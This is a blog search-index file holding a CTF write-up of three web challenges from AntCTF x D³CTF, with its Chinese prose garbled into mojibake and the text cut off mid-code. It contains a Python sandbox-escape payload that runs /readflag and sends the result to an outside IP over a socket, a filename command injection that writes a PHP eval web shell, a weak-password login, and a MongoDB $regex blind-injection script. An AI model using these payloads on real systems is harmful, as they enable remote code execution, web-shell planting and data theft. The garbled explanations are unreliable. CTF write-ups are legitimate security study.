<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AntCTF x DÂ³CTF web å¤ç°</title>
      <link href="/posts/d27bfad9.html"/>
      <url>/posts/d27bfad9.html</url>
      
        <content type="html"><![CDATA[<p>è¿™é‡Œçš„å¤ç°éƒ½æ˜¯å»ç½‘ä¸Šæœç´¢å‰å‡ åå‘çš„wpæ¥å¤ç°çš„</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&amp;mid=2247486967&amp;idx=1&amp;sn=ad55ddd11c6bfa17843270625f5f92fc&amp;chksm=cf53cd41f8244457c2db68626c91f2e4564d756b903222f3a913e89f211d475418864c5041bc&amp;mpshare=1&amp;scene=23&amp;srcid=0501bEUrW8ydbpm175TL5FFn&amp;sharer_sharetime=1682949687637&amp;sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392#rd">Arr wp</a>    <a href="https://fq6p9pyo5tt.feishu.cn/docx/InUFdQUKdozf8yx5IhGcf5zInSe?share_token=50b9c367-3661-4046-95ab-5418bcc155a9">äºšå†›wp</a></p><p>è¿˜æœ‰å‚è€ƒ <a href="https://boogipop.com/">boogipopçš„wp</a></p><h2 id="Escape-Plan"><a href="#Escape-Plan" class="headerlink" title="Escape Plan"></a>Escape Plan</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230502153814922.png" alt="image-20230502153814922"></p><p><strong>The success for a break out depends on three things.</strong><br><strong>- layout: black_char</strong><br><strong>- routine: Python tricks</strong><br><strong>- help: Run /readflag to get flag, dns tunneling may help you</strong></p><p> é¢˜ç›®è¿˜ç»™äº†æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_3</span>():</span><br><span class="line">    cmd = request.form.get(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;pre&gt;</span></span><br><span class="line"><span class="string">import requests, base64</span></span><br><span class="line"><span class="string">exp = &#x27;&#x27;</span></span><br><span class="line"><span class="string">requests.post(&quot;&quot;, data=&#123;&quot;cmd&quot;: base64.b64encode(exp.encode())&#125;).text</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = base64.b64decode(cmd).decode()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bad base64&quot;</span></span><br><span class="line"></span><br><span class="line">    black_char = [</span><br><span class="line">        <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> black_char:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;failed: `<span class="subst">&#123;char&#125;</span>`&#x27;</span></span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&quot;success&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">eval</span>(cmd)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        msg = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„è¯å°±æ˜¯è‡ªå·±æƒ³æ–¹æ³•è¿›è¡Œç»•è¿‡äº†</p><p>æœ€åæ˜¯åœ¨evalè¿™é‡Œè¿›è¡Œä»£ç çš„æ‰§è¡Œ</p><p>å› ä¸ºå…³é”®å‡½æ•°è¢«ç¦äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨å…¨è§’ç¬¦å·è¿›è¡Œç»•è¿‡</p><p>è¿·ä½ ä¸Šæ ‡å’Œä¸‹æ ‡ï¼ˆ0~9ã€å­—æ¯ã€ç‰¹æ®Šå­—ç¬¦ï¼‰</p><p>ç”¨ä¸Šé¢çš„è¿·ä½ ä¸Šæ ‡æˆ–å…¨è§’ç¬¦å·èƒ½èƒ½ç»•è¿‡ï¼Œæœ¬åœ°æµ‹è¯•è¿‡äº†</p><p><img src="../images/image-20230502155533638.png" alt="image-20230502155533638"></p><p><img src="../images/image-20230502155615879.png" alt="image-20230502155615879"></p><p><a href="https://cn-sec.com/archives/1322842.html">å‚è€ƒæ–‡ç« </a></p><p><img src="../images/image-20230502161726816.png" alt="image-20230502161726816"></p><p>ç»™çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64</span><br><span class="line">u = <span class="string">&#x27;ğŸ¢ğŸ£ğŸ¤ğŸ¥ğŸ¦ğŸ§ğŸ¨ğŸ©ğŸªğŸ«&#x27;</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;__import__(&#x27;os&#x27;).popen(&quot;python -c &#x27;import socket, os; flag = os.popen(\\&quot;/readflag\\&quot;).read().encode();host = \\&quot;101.42.39.110\\&quot;;port=666;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host,port));s.sendall(flag);s.close();a=1;&#x27;&quot;).read()&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="built_in">str</span>(base64.b64encode(payload)).strip(<span class="string">&#x27;b&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>) +<span class="string">&quot;=&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">CMD = <span class="string">&quot;áµ‰val(vars(áµ‰val(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(&#123;&#125;()))[len([])]))&quot;</span>.<span class="built_in">format</span>(payload)</span><br><span class="line">CMD = CMD.translate(&#123;<span class="built_in">ord</span>(<span class="built_in">str</span>(i)): u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://139.196.153.118:30503/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">base64.b64encode(CMD.encode())&#125;).text</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure><p>ç„¶åä¸Šé¢æ‰§è¡Œçš„æ˜¯pythonçš„shellåå¼¹</p><p>ç„¶åå°±å¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ¥æ”¶åˆ°äº†</p><p><img src="../images/image-20230502172834323.png" alt="image-20230502172834323"></p><h2 id="d3cloud"><a href="#d3cloud" class="headerlink" title="d3cloud"></a>d3cloud</h2><p>é¢˜ç›®</p><p><strong>admin uses laravel-admin to build a personal cloud disk, and adds a utility function</strong></p><p><img src="../images/image-20230502164406853.png" alt="image-20230502164406853"></p><p>è¿™é‡Œ<code>url/admin</code>è®¿é—®åå°ï¼Œç„¶åå¼±å¯†ç  admin/admin è¿›è¡Œç™»å½•</p><p><img src="../images/image-20230503183023251.png" alt="image-20230503183023251"></p><p>å‘ç°è¿™æ–‡ä»¶åï¼Œç„¶åè¿›è¡Œè¯»å–   è¿›è¡Œé¢˜ç›®çš„æç¤ºå’Œå®˜æ–¹æ–‡ä»¶çš„å¯¹æ¯”ä¹‹åå‘ç°å¤šäº†ä¸‹é¢çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">putFileAs</span>(<span class="params"><span class="variable">$path</span>, <span class="variable">$file</span>, <span class="variable">$name</span>, <span class="variable">$options</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="variable">$supported_file</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;ico&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;mp4&#x27;</span>,<span class="string">&#x27;mp3&#x27;</span>,<span class="string">&#x27;mkv&#x27;</span>,<span class="string">&#x27;avi&#x27;</span>,<span class="string">&#x27;txt&#x27;</span>);</span><br><span class="line"> <span class="variable">$file_type</span>= <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>,PATHINFO_EXTENSION));</span><br><span class="line"> <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_type</span>, <span class="variable">$supported_file</span>)) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$stream</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getRealPath</span>(), <span class="string">&#x27;r+&#x27;</span>);</span><br><span class="line"> <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">put</span>(</span><br><span class="line"> <span class="variable">$path</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$name</span>, <span class="string">&#x27;/&#x27;</span>), <span class="variable">$stream</span>, <span class="variable">$options</span></span><br><span class="line"> );</span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$stream</span>)) &#123;</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$stream</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getClientOriginalExtension</span>() === <span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line"> <span class="variable">$fs</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&quot;unzip -oq &quot;</span>. <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>() . </span><br><span class="line"><span class="variable">$name</span> .<span class="string">&quot; -d &quot;</span> . <span class="variable">$this</span>-&gt;driver-&gt;<span class="title function_ invoke__">getAdapter</span>()-&gt;<span class="title function_ invoke__">getPathPrefix</span>(),<span class="string">&quot;w&quot;</span>);</span><br><span class="line"> <span class="title function_ invoke__">pclose</span>(<span class="variable">$fs</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$path</span> : <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯å¤šäº†è¿™æ®µä»£ç ï¼Œå’Œé¢˜ç›®è¯´çš„å¢åŠ äº†æœ‰ä¸ªæ–°åŠŸèƒ½ç›¸å¯¹åº”</p><p><strong>è¿™é‡Œçš„è¯æ˜¯æœ‰æœ‰ä¸ªè‡ªåŠ¨è§£å‹çš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•åœ¨è¿™é‡Œçš„æŠŠè‡ªå·±æƒ³è¦çš„å‘½ä»¤æ”¾è¿›å‹ç¼©åŒ…é‡Œï¼Œç„¶åè§£å‹åˆ°è‡ªå·±è®¾ç½®çš„ç›®å½•ä¸‹</strong></p><p><img src="../images/image-20230503184537985.png" alt="image-20230503184537985"></p><p>é¢˜ç›®è¿™é‡Œä¹Ÿç»™æç¤ºäº†ï¼Œå°±æ˜¯å»æ‰¾è§£å‹çš„å‡½æ•°æ–¹æ³•é‚£è¾¹</p><p><code>$file_type= strtolower(pathinfo($name,PATHINFO_EXTENSION));</code>é‡Œé¢çš„è¿™æ®µä»£ç æ˜¯è·å–æ–‡ä»¶åç¼€çš„</p><p><img src="../images/image-20230503184215304.png" alt="image-20230503184215304"></p><p><img src="../images/image-20230503184459019.png" alt="image-20230503184459019"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;echo ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+JyA+IC92YXIvd3d3L2h0bWwvcHVibGljLzEucGhw|base64 -</span><br><span class="line">d|bash;.zip</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç›®çš„æ˜¯æŠŠä¸€å¥è¯æœ¨é©¬å†™è¿›æ¥</p><p><img src="../images/image-20230503193106552.png" alt="image-20230503193106552"></p><p>èƒ½è¿›è¡Œåˆ¤æ–­é€šè¿‡</p><p><img src="../images/image-20230503193143283.png" alt="image-20230503193143283"></p><p>è¿™é‡Œçš„è¯å°±å¾—åœ¨æ–‡ä»¶åå‡ºå†™ç äº†</p><p><img src="../images/image-20230503193317019.png" alt="image-20230503193317019"></p><p>éšä¾¿ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶å¹¶æŠ“åŒ…</p><p>å†…å®¹éšä¾¿</p><p><img src="../images/image-20230503193352762.png" alt="image-20230503193352762"></p><p>è¿™ä¸ªä»£ç çš„æ„æ€æ˜¯å°†base64è§£ç åï¼Œç„¶åç”¨bashå‘½ä»¤è¿›è¡Œæ‰§è¡Œ</p><p><code>echo &#39;&lt;?php eval($_POST[1]);?&gt;&#39; &gt; /var/www/html/public/1.php</code></p><p>è¿™å°±æ˜¯ç­‰ä¼šæ‰§è¡Œçš„å‘½ä»¤</p><p><img src="../images/image-20230503193609807.png" alt="image-20230503193609807"></p><p>æˆåŠŸè¿›è¡Œæ‰§è¡Œäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fs = popen(&quot;unzip -oq &quot;. $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix() . $name .&quot; -d &quot; . $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix(),&quot;w&quot;);</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç å°±æ˜¯æŠŠä¸Šä¼ æ–‡ä»¶çš„å‹ç¼©æ–‡ä»¶çš„åœ°å€ç»™è§£å‹åˆ°å½“å‰åœ°å€</p><p><code>unzip -oq /xxx/xxx/xxx/1.zip -d /xxx/xxx/xxx/</code></p><p>è¿™ä¸ª1.zipå¤„å°±æ˜¯æˆ‘ä»¬å¯æ§çš„æ–‡ä»¶åï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨åˆ†å·éš”å¼€ï¼Œç„¶åè¿›è¡Œæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å…¶ä»–å‘½ä»¤äº†</p><h2 id="d3node"><a href="#d3node" class="headerlink" title="d3node"></a>d3node</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230503194127075.png" alt="image-20230503194127075"></p><p>æŸ¥çœ‹ç¬¬ä¸€ä¸ªhintåï¼Œå‘ç°æ˜¯nosqlæ³¨å…¥é‡Œçš„<strong>MongoDB</strong>æ³¨å…¥</p><p><img src="../images/image-20230503194941896.png" alt="image-20230503194941896"></p><p><a href="https://xz.aliyun.com/t/9908#toc-4">Nosql æ³¨å…¥ä»é›¶åˆ°ä¸€</a></p><p>å¯ä»¥ä»è¿™ç¯‡æ–‡ç« æ¥è¿›è¡Œå­¦ä¹ </p><p><img src="../images/image-20230503195510880.png" alt="image-20230503195510880"></p><p>è¾“å…¥è¿‡æ»¤çš„è¯ä¼šè¾“å‡ºHacker</p><p>è¾“å…¥é”™è¯¯çš„å¯†ç æ˜¯ä¼šè¾“å‡ºä¸‹é¢çš„ä¸œè¥¿</p><p><img src="../images/image-20230503195603571.png" alt="image-20230503195603571"></p><p>ä½¿ç”¨<code>password[$regex]=.*&amp;username=admin</code></p><p><strong>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•ç™»å½•çš„ä¸æ˜¯adminç”¨æˆ·</strong></p><p><strong>è¿™ä¸ªå°±æ˜¯å¯¹å¯†ç çš„æ­£åˆ™åŒ¹é…ï¼Œè¿™é‡Œçš„è¯æ˜¯ä½¿ç”¨é€šé…ç¬¦æ¥åŒ¹é…</strong>(ä¸Šé¢ç»™çš„nosqlçš„æ–‡ç« é‡Œè®²çš„å¾ˆæ¸…æ¥šè¿™ä¸ªæ­£åˆ™åŒ¹é…)</p><p><img src="../images/image-20230504193625735.png" alt="image-20230504193625735"></p><p>è¿™ä¸ªä¹Ÿè¡Œï¼Œå°±æ˜¯</p><p>ç›²æ³¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">dicts = <span class="string">&#x27;0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> dicts:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;testing&#x27;</span>, s)</span><br><span class="line">        url = <span class="string">&#x27;http://47.102.98.112:32299/user/LoginIndex&#x27;</span></span><br><span class="line">        res = requests.post(url,data=json.dumps(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: &#123;<span class="string">&#x27;$regex&#x27;</span>: <span class="string">&#x27;^&#x27;</span> + flag + s&#125;&#125;), headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hacker&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">            quit()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;invalid&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += s</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found!!!&#x27;</span>, flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ç„¶åå°±è·Ÿæ®invalidçš„å‡ºç°çš„æ ‡å¿—æ¥åˆ¤æ–­å¯†ç </p><p>æœ€å¥½çˆ†å‡ºå¯†ç ä¸º  <code>dob2xdriaqpytdyh6jo3</code></p><p>ç„¶åè¿›è¡Œç™»å½•</p><p><img src="../images/image-20230503195900909.png" alt="image-20230503195900909"></p><p>æŸ¥çœ‹æºç åå‘ç°ç¬¬äºŒä¸ªhint</p><p><img src="../images/image-20230503195943805.png" alt="image-20230503195943805"></p><p><img src="../images/image-20230503201834175.png" alt="image-20230503201834175"></p><p>ç„¶åæµ‹è¯•äº†ä¸€ä¸‹æ˜¯åœ¨è¿™ä¸ªç›®å½•ä¸‹å¯ä»¥è¿›è¡Œæ–‡ä»¶çš„è¯»å– (<strong>è¿™é‡Œä¼šæµ‹è¯•æ—¶å› ä¸ºæç¤ºç»™çš„ä»£ç ä¸­æœ‰filenameè¿™ä¸ªå‚æ•°</strong>)  <strong>req.query.filename</strong></p><p><img src="../images/image-20230503201931320.png" alt="image-20230503201931320"></p><p>ä¸ç»™è¯»å–ï¼Œç„¶åå°±å°è¯•ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filename[href]=a&amp;filena</span><br><span class="line">me[origin]=1&amp;filename[protocol]=file:&amp;filename[hostname]=&amp;filename[pathname]=./%25</span><br><span class="line">61pp.js</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä½¿ç”¨äº†ä¸€ä¸ªJavaScriptå¯¹è±¡æ¥è¡¨ç¤ºæ–‡ä»¶è·¯å¾„ã€‚å…¶ä¸­ï¼Œâ€filenameâ€æ˜¯è¯¥å¯¹è±¡çš„å±æ€§åï¼Œâ€ [href]â€ã€â€[origin]â€ã€â€[protocol]â€ã€â€[hostname]â€å’Œâ€[pathname]â€åˆ™æ˜¯è¯¥å±æ€§ä¸‹çš„å­å±æ€§ã€‚å…·ä½“ æ¥è¯´ï¼Œå®ƒä»¬åˆ†åˆ«è¡¨ç¤ºæ–‡ä»¶çš„é“¾æ¥åœ°å€ã€æ¥æºã€åè®®ã€ä¸»æœºåå’Œæ–‡ä»¶è·¯å¾„ã€‚ è¿™é‡Œçš„%2561å…¶å®å°±æ˜¯ã€‚å¦‚æœæœ‰éasciiè¿›è¡ŒurlåŠ å¯†ï¼Œåˆ™å°±ä¼šå˜æˆ16è¿›åˆ¶ç„¶åå†è¿›è¡Œurlç¼–ç ï¼Œaçš„16è¿› åˆ¶æ˜¯61</p><p><strong>å…¶å®å°±æ˜¯å¯¹aè¿›è¡Œä¸¤æ¬¡urlç¼–ç </strong></p><p>ç„¶åå°±å¯ä»¥æˆåŠŸçš„æŸ¥çœ‹åˆ°app.jsäº†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> stringRandom = <span class="built_in">require</span>(<span class="string">&quot;string-random&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// register router</span></span><br><span class="line"><span class="keyword">const</span> indexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/index&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> userRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/user&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> dashboardIndexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/dashboardIndex&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;hbs&#x27;</span>).<span class="property">__express</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">stringRandom</span>(<span class="number">32</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">        <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * 